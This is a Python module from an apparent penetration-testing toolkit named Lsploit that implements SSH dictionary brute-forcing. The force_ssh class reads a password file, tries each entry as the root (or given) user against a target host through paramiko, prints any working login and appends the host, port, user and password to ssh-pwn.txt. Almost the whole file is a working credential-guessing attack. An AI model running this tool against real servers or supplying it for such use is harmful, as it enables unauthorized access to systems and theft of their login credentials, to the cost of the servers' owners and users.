'''
 *@author:wr
 *@GitHub:https://github.com/wr0x00/Lsploit
 *@date:2022.8.2
 *@description: ssh字典爆破功能
'''

# /usr/bin/env/python
# -*- coding:utf-8 -*-
import paramiko

#设置语言
if not __name__ == '__main__':
	try:
		import json
		# 读入示例json数据
		j= open('modules\configs.json', encoding='utf-8')
		demo_json = json.loads(j.read())

		if demo_json["language"]=='cn'or demo_json["language"]=='CN':
			from .strings import String_CN as Str
		
		if demo_json["language"]=='en'or demo_json["language"]=='EN':
			from .strings import String_EN as Str

	except Exception as e:
		from .strings import String_EN as Str
		print(e)

class sgin:
    EXC = '[!]'
    STR = '[*]'
    PLS = '[+]'
    MIN = '[-]'

class force_ssh:
    def __init__(self,host,pwddict,users='root',port=22):
       try:
            print (Str.LOADING)
            passwords = open(pwddict,'rb')
            for passwds in passwords.readlines():
                passwdss = passwds.decode(encoding='UTF-8').strip('\r\n')
                self.get_pwn(users,passwdss,host,port)

       except Exception as e:
        print('\033[0;31m'+sgin.EXC+e+'\033[1;37;40m')
        exit()
       


    def get_pwn(self,userss,passwdss,hosts,port):
            try:
                print(sgin.STR+"Now is trying:"+passwdss)
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hosts, port, userss, passwdss)
                print('\n\033[32m[+]'+Str.SUCCESS_SSH+' IP:' + hosts +" "+Str.PORT +": "+ str(port) +"\n"+Str.USER+':' + userss+' '+Str.PWD+':' + passwdss + '\033[1;37;40m')
                f = open('ssh-pwn.txt', 'a')
                f.write(hosts + ":" + str(port) + " - " + userss + ':' + passwdss)
                f.write('\n')
                ssh.close()

            except:
                pass